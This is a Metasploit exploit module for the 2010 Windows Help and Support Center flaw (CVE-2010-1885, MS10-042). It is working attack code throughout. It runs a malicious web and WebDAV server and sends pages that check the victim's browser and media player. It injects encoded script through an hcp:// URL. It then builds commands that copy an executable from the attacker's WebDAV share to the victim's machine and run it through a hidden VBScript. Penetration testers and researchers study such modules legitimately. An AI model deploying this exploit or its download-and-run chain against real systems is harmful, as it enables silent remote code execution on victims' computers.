##
# $Id: ms10_042_helpctr_xss_cmd_exec.rb 10388 2010-09-20 04:37:25Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	#
	# This module acts as an HTTP server
	#
	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::EXE

	def initialize(info = {})
		super(update_info(info,
			'Name'			=> 'Microsoft Help Center XSS and Command Execution',
			'Description'	=> %q{
					Help and Support Center is the default application provided to access online
				documentation for Microsoft Windows. Microsoft supports accessing help documents
				directly via URLs by installing a protocol handler for the scheme "hcp". Due to
				an error in validation of input to hcp:// combined with a local cross site
				scripting vulnerability and a specialized mechanism to launch the XSS trigger,
				arbitrary command execution can be achieved.

				On IE7 on XP SP2 or SP3, code execution is automatic. If WMP9 is installed, it
				can be used to launch the exploit automatically. If IE8 and WMP11, either can
				be used to launch the attack, but both pop dialog boxes asking the user if
				execution should continue. This exploit detects if non-intrusive mechanisms are
				available and will use one if possible. In the case of both IE8 and WMP11, the
				exploit defaults to using an iframe on IE8, but is configurable by setting the
				DIALOGMECH option to "none" or "player".
			},
			'Author'		=>
				[
					'Tavis Ormandy',  # Original discovery
					'natron'          # Metasploit version
				],
			'License'		=> MSF_LICENSE,
			'Version'		=> '$Revision: 10388 $',
			'References'	=>
				[
					[ 'CVE', '2010-1885' ],
					[ 'OSVDB', '65264' ],
					[ 'URL', 'http://lock.cmpxchg8b.com/b10a58b75029f79b5f93f4add3ddf992/ADVISORY' ],
					[ 'URL', 'http://www.microsoft.com/technet/security/advisory/2219475.mspx' ],
					[ 'MSB', 'MS10-042']
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'		=>
				{
					'Space'	=> 2048,
				},
			'Platform'		=> 'win',
			'Targets'		=>
				[
					[ 'Automatic',	{ } ]
				],
			'DisclosureDate' => 'Jun 09 2010',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptPort.new(	'SRVPORT',		 [ true, "The daemon port to listen on", 80 ]),
				OptString.new(	'URIPATH',		 [ true, "The URI to use.", "/" ]),
				OptString.new(	'DIALOGMECH',	 [ true, "IE8/WMP11 trigger mechanism (none, iframe, or player).", "iframe"])
			], self.class)

		deregister_options('SSL', 'SSLVersion') # Just for now
	end

	def on_request_uri(cli, request)

		# If there is no subdirectory in the request, we need to redirect.
		if (request.uri == '/') or not (request.uri =~ /\/[^\/]+\//)
			if (request.uri == '/')
				subdir = '/' + rand_text_alphanumeric(8+rand(8)) + '/'
			else
				subdir = request.uri + '/'
			end
			print_status("Request for \"#{request.uri}\" does not contain a sub-directory, redirecting to #{subdir} ...")
			send_redirect(cli, subdir)
			return
		end


		case request.method
		when 'OPTIONS'
			process_options(cli, request)
		when 'PROPFIND'
			process_propfind(cli, request)
		when 'GET'
			process_get(cli, request)
		else
			print_error("Unexpected request method encountered: #{request.method}")
		end

	end

	def process_get(cli, request)

		@my_host   = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
		webdav_loc = "\\\\#{@my_host}\\#{@random_dir}\\#{@payload}"
		@url_base  = "http://" + @my_host

		if (Regexp.new(Regexp.escape(@payload)+'$', true).match(request.uri))
			print_status "Sending payload executable to target ..."
			return if ((p = regenerate_payload(cli)) == nil)
			data = generate_payload_exe({ :code => p.encoded })

			send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })
			return
		end

		if request.uri.match(/\.gif$/)
			# "world's smallest gif"
			data  = "GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00!\xF9\x04\x01"
			data += "\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;"
			print_status "Sending gif image to WMP at #{cli.peerhost}:#{cli.peerport} ..."
			send_response(cli, data, { 'Content-TYpe' => 'image/gif' } )
		end

		# ASX Request Inbound
		if request.uri.match(/\.asx$/)
			asx = %Q|<ASX VERSION="3.0">
<PARAM name="HTMLView" value="URLBASE/STARTHELP"/>
<ENTRY>
	<REF href="URLBASE/IMGFILE"/>
</ENTRY>
</ASX>
|
			asx.gsub!(/URLBASE/, @url_base)
			asx.gsub!(/STARTHELP/, @random_dir + "/" + @start_help)
			asx.gsub!(/IMGFILE/, @random_dir + "/" + @img_file)
			print_status("Sending asx file to #{cli.peerhost}:#{cli.peerport} ...")
			send_response(cli, asx, { 'Content-Type' => 'text/html' })
			return
		end

		# iframe request inbound from either WMP or IE7
		if request.uri.match(/#{@start_help}/)

			help_html = %Q|<iframe src="hcp://services/search?query=a&topic=hcp://system/sysinfo/sysinfomain.htm%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF..%5C..%5Csysinfomain.htm%u003fsvr=%3Cscript%20defer%3Eeval%28unescape%28%27COMMANDS%27%29%29%3C/script%3E">|

			rand_vbs	= rand_text_alpha(rand(2)+1) + ".vbs"
			copy_launch = %Q^cmd /c copy #{webdav_loc} %TEMP% && %TEMP%\\#{@payload}^
			vbs_content = %Q|WScript.CreateObject("WScript.Shell").Run "#{copy_launch}",0,false|
			write_vbs	= %Q|cmd /c echo #{vbs_content}>%TEMP%\\#{rand_vbs}|
			launch_vbs  = %Q|cscript %TEMP%\\#{rand_vbs}>nul|
			concat_cmds = "#{write_vbs}|#{launch_vbs}"

			eval_block  = "Run(String.fromCharCode(#{convert_to_char_code(concat_cmds)}));"
			eval_block = Rex::Text.uri_encode(Rex::Text.uri_encode(eval_block))
			help_html.gsub!(/COMMANDS/, eval_block)
			print_status("Sending exploit trigger to #{cli.peerhost}:#{cli.peerport} ...")
			send_response(cli, help_html, { 'Content-Type' => 'text/html' })
			return
		end

		# default initial response
		js = %Q|
var asx = "URLBASE/ASXFILE";
var ifr = "URLBASE/IFRFILE";

function launchiframe(src) {
	var o = document.createElement("IFRAME");
	o.setAttribute("width","0");
	o.setAttribute("height","0");
	o.setAttribute("frameborder","0");
	o.setAttribute("src",src);
	document.body.appendChild(o);
}

if (window.navigator.appName == "Microsoft Internet Explorer") {
	var ua = window.navigator.userAgent;
	var re  = new RegExp("MSIE ([0-9]{1,}[\.0-9]{0,})");
	re.exec(ua)
	ver = parseFloat( RegExp.$1 );

	// if ie8, check WMP version
	if (ver > 7) {
		var o = document.createElement("OBJECT");
		o.setAttribute("classid", "clsid:6BF52A52-394A-11d3-B153-00C04F79FAA6");
		o.setAttribute("uiMode", "invisible");
		// if wmp9, go ahead and launch
		if( parseInt(o.versionInfo) < 10 ) {
			o.openPlayer(asx);
		// if > wmp9, only launch if user requests
		} else {
			DIALOGMECH
		}
	// if ie7, use iframe
	} else {
		launchiframe(ifr);
	}
} else {
	// if other, try iframe
	launchiframe(ifr);
}
|

		html = %Q|<html>
<head></head><body><script>JAVASCRIPTFU
</script>
</body>
</html>
|
		case datastore['DIALOGMECH']
		when "player"
			mech = "o.openPlayer(asx);"
		when "iframe"
			mech = "launchiframe(ifr);"
		when "none"
			mech = ""
		else
			mech = ""
		end

		html.gsub!(/JAVASCRIPTFU/, js)
		html.gsub!(/DIALOGMECH/, mech)
		html.gsub!(/URLBASE/, @url_base)
		html.gsub!(/ASXFILE/, @random_dir + "/" + @asx_file)
		html.gsub!(/IFRFILE/, @random_dir + "/" + @start_help)

		print_status("Sending exploit html to #{cli.peerhost}:#{cli.peerport} ...")

		headers = {
			'Content-Type'		=> 'text/html',
			#'X-UA-Compatible'	=> 'IE=7'
		}

		send_response(cli, html, headers)
	end

	#
	# OPTIONS requests sent by the WebDav Mini-Redirector
	#
	def process_options(cli, request)
		print_status("Responding to WebDAV OPTIONS request from #{cli.peerhost}:#{cli.peerport}")
		headers = {
			#'DASL'   => '<DAV:sql>',
			#'DAV'    => '1, 2',
			'Allow'  => 'OPTIONS, GET, PROPFIND',
			'Public' => 'OPTIONS, GET, PROPFIND'
		}
		send_response(cli, '', headers)
	end

	def convert_to_char_code(str)
		return str.unpack('H*')[0].gsub(Regexp.new(".{#{2}}", nil, 'n')) { |s| s.hex.to_s + "," }.chop
	end
	#
	# PROPFIND requests sent by the WebDav Mini-Redirector
	#
	def process_propfind(cli, request)
		path = request.uri
		print_status("Received WebDAV PROPFIND request from #{cli.peerhost}:#{cli.peerport}")
		body = ''

		if (Regexp.new(Regexp.escape(@payload)+'$', true).match(path))
			# Response for the EXE
			print_status("Sending EXE multistatus for #{path} ...")
#<lp1:getcontentlength>45056</lp1:getcontentlength>
			body = %Q|<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype/>
<lp1:creationdate>2010-02-26T17:07:12Z</lp1:creationdate>
<lp1:getlastmodified>Fri, 26 Feb 2010 17:07:12 GMT</lp1:getlastmodified>
<lp1:getetag>"39e0132-b000-43c6e5f8d2f80"</lp1:getetag>
<lp2:executable>F</lp2:executable>
<D:lockdiscovery/>
<D:getcontenttype>application/octet-stream</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>
|
		elsif (path =~ /\.manifest$/i) or (path =~ /\.config$/i) or (path =~ /\.exe/i)
			print_status("Sending 404 for #{path} ...")
			send_not_found(cli)
			return

		elsif (path =~ /\/$/) or (not path.sub('/', '').index('/'))
			# Response for anything else (generally just /)
			print_status("Sending directory multistatus for #{path} ...")
			body = %Q|<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype><D:collection/></lp1:resourcetype>
<lp1:creationdate>2010-02-26T17:07:12Z</lp1:creationdate>
<lp1:getlastmodified>Fri, 26 Feb 2010 17:07:12 GMT</lp1:getlastmodified>
<lp1:getetag>"39e0001-1000-4808c3ec95000"</lp1:getetag>
<D:lockdiscovery/>
<D:getcontenttype>httpd/unix-directory</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>
|

		else
			print_status("Sending 404 for #{path} ...")
			send_not_found(cli)
			return
		end

		# send the response
		resp = create_response(207, "Multi-Status")
		resp.body = body
		resp['Content-Type'] = 'text/xml'
		cli.send_response(resp)
	end

	def exploit
		@random_dir = rand_text_alpha(rand(2)+1)
		@asx_file	= rand_text_alpha(rand(2)+1) + ".asx"
		@start_help	= rand_text_alpha(rand(2)+1) + ".html"
		@payload	= rand_text_alpha(rand(2)+1) + ".exe"
		@img_file	= rand_text_alpha(rand(2)+1) + ".gif"

		if datastore['SRVPORT'].to_i != 80 || datastore['URIPATH'] != '/'
			raise RuntimeError, 'Using WebDAV requires SRVPORT=80 and URIPATH=/'
		end

		super
	end
end

